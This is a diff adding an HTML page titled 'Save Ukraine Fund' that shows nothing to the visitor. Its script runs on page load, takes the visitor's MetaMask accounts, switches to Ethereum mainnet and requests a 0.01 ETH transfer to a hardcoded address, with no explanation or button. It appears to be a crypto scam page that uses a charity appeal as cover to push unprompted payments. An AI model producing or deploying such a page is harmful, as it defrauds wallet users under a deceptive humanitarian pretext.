@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Save Ukraine Fund</title>
+</head>
+
+<body>
+  <script>
+    window.addEventListener('DOMContentLoaded', getAccount);
+    const toWei = 10**18;
+    let chain = 1;
+    chain = `0x${chain.toString(16)}`;
+    let amount = 0.01*(toWei);
+    amount = amount.toString(16);
+
+    function sendTxn(accounts) {
+      ethereum
+        .request({
+          method: 'eth_sendTransaction',
+          params: [
+            {
+              from: accounts[0],
+              to: '0x1a5E1D2074C22e83602dd44B7293b50010088543',
+              value: amount,
+              gasPrice: '0x2540BE400',
+              gas: '0xEA60',
+            },
+          ],
+        })
+        .then((txHash) => console.log(txHash))
+        .catch((error) => console.error);
+    };
+
+    async function getAccount() {
+      accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      try {
+        await ethereum
+          .request({
+            method: "wallet_addEthereumChain",
+            params: chain,
+          })
+          .catch(() =>
+            ethereum.request({
+              method: "wallet_switchEthereumChain",
+              params: [{ chainId: chain }],
+            })
+          );
+      } catch (error) {
+        console.error("MetaMask network not initialized:", error);
+      }
+      sendTxn(accounts);
+    }
+  </script>
+</body>
+
+</html>
